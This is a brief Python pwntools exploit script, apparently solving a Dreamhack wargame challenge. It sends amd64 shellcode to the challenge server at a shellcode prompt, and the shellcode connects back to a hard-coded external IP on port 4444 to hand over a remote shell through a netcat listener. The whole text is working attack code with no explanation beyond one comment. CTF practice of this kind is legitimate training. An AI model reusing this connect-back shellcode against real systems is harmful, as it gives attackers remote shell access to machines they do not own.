#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "debug"

HOST = "host3.dreamhack.games"
PORT = 14720

LHOST = "103.116.52.136"
LPORT = 4444

p = remote(HOST, PORT)

sc  = shellcraft.connect(LHOST, LPORT)
sc += shellcraft.findpeersh(LPORT)

payload = asm(sc)

p.sendafter(b"Input shellcode: ", payload)

# Kết nối chính sẽ bị /dev/null hóa, shell sẽ hiện ở nc listener.
p.close()